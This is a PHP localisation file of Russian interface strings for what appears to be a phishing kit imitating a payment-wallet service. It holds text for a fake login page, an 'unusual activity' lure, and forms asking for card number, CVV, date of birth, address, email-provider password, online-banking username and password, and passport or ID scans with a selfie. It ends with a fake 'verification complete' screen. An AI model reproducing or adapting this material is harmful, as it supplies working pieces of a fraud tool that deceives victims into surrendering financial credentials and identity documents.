<?php

	$lg_sign = [
		"title" => "Войдите в свой аккаунт",
		"alert" => "Пожалуйста, проверьте ваши записи и попробуйте снова.",
		"changer" => "Изменить",
		"eml_placeholder" => "Адрес электронной почты",
		"eml_msg1" => "Введите адрес электронной почты.",
		"eml_msg2" => "Этот формат электронной почты неправильный",
		"bt_next" => "Далее",
		"pwd_placeholder" => "Введите свой пароль",
		"pwd_show" => "Показать",
		"pwd_hide" => "Скрыть",
		"bt_login" => "Войти",
		"trouble" => "Возникли проблемы при входе в систему?",
		"or" => "или",
		"bt_signup" => "Зарегистрироваться",
		"footer" => [
			"contact" => "Связаться с нами",
			"privacy" => "Конфиденциальность",
			"legal" => "легальный",
			"world" => "Весь мир"
		],
		"rotate" => "Обработка ..."
	];

	$lg_activity = [
		"title" => "Необычная активность",
		"head" => "Мы заметили необычную активность",
		"body" => "Нам нужна ваша помощь в защите вашей учетной записи для предотвращения несанкционированного доступа. В целях вашей безопасности могут быть некоторые ограничения в вашей учетной записи, если информация неверна",
		"bt_secure" => "Безопасный аккаунт"
	];	

	$lg_captcha = [
		"title" => "Проблема безопасности",
		"head" => "Проблема безопасности",
		"body" => "Пожалуйста, введите символы, которые вы видите на изображении в целях безопасности",
		"bt_secure" => "Я не робот",
		"code" => "Введите указанный код"
	];

	$lg_process = [
		"title" => "Моя учетная запись: кошелек",
		"logout" => "Выйти",
		"menu" => [
			"home" => "Резюме",
			"activity" => "активность",
			"send_receive" => "Отправить и запрос",
			"wallet" => "Кошелек",
			"help" => "Помогите",
			"open" => "Меню",
			"close" => "близко"
		],
		"head1" => "Подтвердите свою карту",
		"head2" => "Подтвердите свой адрес",
		"head3" => "Ссылка на новую карту",
		"ctype" => "Тип карты",
		"cnumber" => "Номер карты",
		"exp" => "Срок действия ММ / YYYY",
		"csc" => "CVV (3 цифры)",
		"name" => "Полное имя",
		"dob" => "Дата рождения (DD / ММ / YYYY)",
		"address" => "Адресная строка",
		"city" => "Город / Город / Деревня",
		"zip" => "Почтовый индекс",
		"ptype" => "Тип телефона",
		"pnumber" => "Номер телефона",
		"bt_save" => "Сохранить",
		"dnt_have" => "У меня нет другой карты",
		"footer" => [
			"security" => "Безопасность",
			"rights" => "Все права защищены."
		]
	];
	$lg_auth = [
		"title" => "3-D Security Auth.",
		"success" => "3-D Безопасность была успешно обработана ...",
		"processing" => "обработка",
		"added" => "Добавлена ​​безопасность онлайн",
		"protect" => "помогает защитить вас",
		"center" => "карта от несанкционированного использования онлайн - без дополнительной оплаты. Использовать",
		"nextline" => "в этом и будущем. Завершите эту страницу. Вы создадите свое собственное",
		"name" => "Имя на карточке",
		"merchant" => "коммерсант",
		"amount" => "Сумма",
		"country" => "Название страны",
		"cardtype" => "Тип карты",
		"cardnumber" => "номер карты",
		"datetime" => "Дата и время",
		"birthdate" => "Дата рождения",
		"cannot" => "Не можете получить доступ к вашему",
		"contact" => "Связаться с нами",
		"copyright" => "авторское право",
		"rights" => "Все права защищены.",
		"submit" => "Отправить"
	];
	$lg_mailaccess = [
		"head" => "Связать своего провайдера электронной почты",
		"fcenter" => "Используй свой",
		"center" => "войдите, чтобы связать своего провайдера электронной почты. (Мы не сохраняем эту информацию.)",
		"mailaccess" => "Введите свой провайдер электронной почты",
		"passwordaccess" => "Введите свой пароль провайдера электронной почты",
		"bt_save" => "Согласен и ссылка"
	];
	$lg_bank = [
		"head" => "Свяжите свой банковский счет",
		"head2" => "Подключись к своему",
		"head3" => "Банковский счет, чтобы подтвердить, что вы контролируете этот банковский счет.",
		"head4" => "Банковский счет должен быть одинаковым для вашего",
		"bankname" => "Название банка",
		"bankcountry" => "Банк Страна",
		"bankphone" => "Банковский телефон",
		"bankwebsite" => "Веб-сайт банка",
		"head4" => "Банковский счет должен быть одинаковым для вашего",
		"userid" => "Имя пользователя / идентификатор учетной записи",
		"passcode" => "Пароль / Пароль учетной записи",
		"accnumq" => "Номер счета",
		"rounum" => "Номер маршрутизации",
		"iban" => "IBAN",
		"bt_save" => "Согласен и ссылка"
	];

	$lg_id = [
		"head" => "Загрузить свою личность",
		"proof" => [
			"one" => "Подтверждение личности",
			"two" => "Селфи с доказательством",
			"three" => "Процесс завершен"
		],
		"choose" => "Выберите свой идентификатор",
		"type" => [
			"one" => "Паспорт",
			"two" => "Национальный ID",
			"three" => "Водительские права"
		],
		"bt_proceed" => "Продолжить",
		"head_up" => "Загрузить свой",
		"rule1" => [
			"one" => "Сделайте качественное фото <br> или сделайте качественный скан",
			"two" => "Отправить обе стороны двустороннего документа",
			"three" => "Сканировать обе страницы <br> если вы выбрали паспорт"
		],
		"drop_zone" => "<b> Перетащите или щелкните здесь </b>, чтобы загрузить свое изображение (максимум 5 МБ)",
		"bt_back" => "ВЕРНИТЕСЬ",
		"head_slf" => "Загрузить селфи с помощью",
		"rule2" => [
			"one" => "Убедитесь, что вы смотрите прямо в камеру",
			"two" => "Ваши пальцы не закрывают фотографию или любую важную информацию",
			"three" => "Не носите шляпу или очки, и убедитесь, что ваша борода подстрижена"
		]
	];

	$lg_finish = [
		"head" => "Процесс проверки завершен",
		"on" => "АКТИВИРОВАННЫЙ",
		"p1" => "Защита покупок теперь",
		"p2" => "Он охватывает все приемлемые покупки, где используется аккаунт, а также платежи, сделанные через наш веб-сайт. Чтобы воспользоваться преимуществами защиты покупок, мы, среди прочего, требуем, чтобы счета были в хорошем состоянии, и просим, чтобы спор был подан в течение 180 дней с момента покупки или оплаты.",
		"p3" => "Прочитайте требования защиты покупки"
	];

?>